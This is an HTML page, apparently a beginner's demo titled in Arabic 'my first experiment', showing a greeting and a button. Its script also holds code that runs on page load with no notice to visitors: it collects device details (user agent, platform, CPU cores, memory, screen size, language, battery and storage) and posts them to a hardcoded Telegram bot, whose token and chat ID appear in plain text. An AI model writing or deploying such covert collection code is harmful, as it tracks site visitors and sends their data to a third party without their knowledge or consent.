<!DOCTYPE html>
<html>
<head>
    <title>تجربتي الأولى</title>
    <style>
        body {
            font-family: Arial;
            text-align: center;
            margin-top: 50px;
        }
        button {
            padding: 10px 20px;
            background: #4285f4;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1 id="greeting">مرحباً بالزائر!</h1>
    <button onclick="changeText()">انقر هنا</button>

    <script>
        // هذه المنطقة تكتب فيها كود JavaScript
        // config.js - ملف الإعدادات (اختياري)
const TELEGRAM_BOT_TOKEN = "7517879972:AAF8cV7AValEWxo9NyihtHDsFe7ZRjfmW-s";
const TELEGRAM_CHAT_ID = "6913353602";

// utils.js - الوظائف المساعدة
async function getBasicInfo() {
    try {
        // هذه المعلومات غير متاحة مباشرة في متصفح الويب
        // بسبب قيود الأمان، لكن يمكن الحصول على بعضها
        const info = {
            deviceName: navigator.userAgent,
            onlineStatus: navigator.onLine ? "Connected" : "Offline",
            platform: navigator.platform
        };
        
        console.log(`Device name: ${info.deviceName} 📱`);
        console.log(`Online status: ${info.onlineStatus} 🛜`);
        return info;
    } catch (e) {
        console.error("Failed to get basic information:", e);
        return null;
    }
}

async function getBatteryInfo() {
    try {
        if ('getBattery' in navigator) {
            const battery = await navigator.getBattery();
            
            console.log("\n🔋 Battery Info:");
            console.log(`- Percentage: ${Math.floor(battery.level * 100)}%`);
            console.log(`- Charging: ${battery.charging ? "Yes" : "No"}`);
            
            return {
                percent: Math.floor(battery.level * 100),
                plugged: battery.charging,
                status: battery.charging ? "Charging" : "Discharging"
            };
        } else {
            console.log("Battery API not supported");
            return null;
        }
    } catch (e) {
        console.error("Battery check error:", e);
        return null;
    }
}

async function getSafeDeviceInfo() {
    try {
        const systemInfo = {
            'Device type': navigator.platform,
            'Operating system': navigator.platform,
            'User agent': navigator.userAgent,
            'CPU cores': navigator.hardwareConcurrency || "Unknown",
            'Current time': new Date().toLocaleString(),
            'Device language': navigator.language,
            'Screen resolution': `${window.screen.width}x${window.screen.height}`,
            'Available RAM': `${Math.round(navigator.deviceMemory || 0)} GB`
        };

        // Battery info
        const battery = await getBatteryInfo();
        if (battery) {
            systemInfo['Battery percentage'] = `${battery.percent}%`;
            systemInfo['Charging status'] = battery.charging ? "Charging" : "Not charging";
        }

        // Storage estimation (ليس دقيقًا في المتصفح)
        if ('storage' in navigator && 'estimate' in navigator.storage) {
            try {
                const storage = await navigator.storage.estimate();
                systemInfo['Storage quota'] = `${Math.round(storage.quota / (1024**3))} GB`;
                systemInfo['Storage used'] = `${Math.round(storage.usage / (1024**3))} GB`;
            } catch (e) {
                console.error("Storage error:", e);
            }
        }

        return {'📱 System Information': systemInfo};
    } catch (e) {
        return {'❌ Error': `Failed to collect info: ${e.message}`};
    }
}

async function sendToTelegram(message) {
    try {
        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            console.error("Telegram credentials missing");
            return false;
        }

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const data = {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        };

        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        });

        return response.ok;
    } catch (e) {
        console.error("Telegram error:", e);
        return false;
    }
}

async function displayAndSendInfo() {
    console.log("Collecting device information...\n");
    await getBasicInfo();
    const info = await getSafeDeviceInfo();
    
    let telegramMessage = "<b>Device Information Report</b>\n\n";
    
    for (const [category, details] of Object.entries(info)) {
        console.log(`\n${category}:`);
        telegramMessage += `<b>${category}:</b>\n`;
        for (const [key, value] of Object.entries(details)) {
            console.log(`- ${key}: ${value}`);
            telegramMessage += `- ${key}: ${value}\n`;
        }
    }
    
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
        console.log("\nSending to Telegram...");
        const success = await sendToTelegram(telegramMessage);
        console.log(success ? "Sent successfully!" : "Failed to send");
    }
}

// تشغيل الوظيفة الرئيسية عند تحميل الصفحة
document.addEventListener('DOMContentLoaded', async () => {
    await displayAndSendInfo();
});
        function changeText() {
            document.getElementById("greeting").innerText = "شكراً للنقر!";
            document.body.style.backgroundColor = "#f0f0f0";
        }
    </script>
</body>
</html>